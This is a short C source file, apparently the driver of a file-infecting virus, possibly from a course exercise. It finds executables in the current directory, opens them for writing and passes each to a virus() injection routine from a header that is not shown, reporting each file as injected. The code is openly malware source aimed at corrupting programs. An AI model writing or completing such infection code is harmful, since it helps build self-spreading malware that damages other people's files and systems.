#include "get_file_info.h"
#include "virus_inject.h"
#include <stdlib.h>
int main() {
    int MaxFileNum = MAXPATH;
    char path[10] = "*";
    int exe_file_num = 0;
    int i;
    FILE * file_list[MAXFILENUM];
    FILE* fd;
    SearchDirFile(path, MaxFileNum);//当前目录下所有文件名
    for (i = 0; i < MaxFileNum; i++) {
        printf("%s\n", filename[i]);
    }
    for (i = 0; i < MaxFileNum; i++) {
        fd = fopen(filename[i], "rb+");
        if (is_exe(fd)){
            printf("%s is exectuable!\n", filename[i]);//当前目录下所有可执行文件
            file_list[exe_file_num++] = fd;
        }
    }
    for (i = 0; i < exe_file_num; i++) {
        virus(file_list[i]);
        printf("%s has been injected!\n", filename[i]);
    }

    system("pause");
	return 0;
}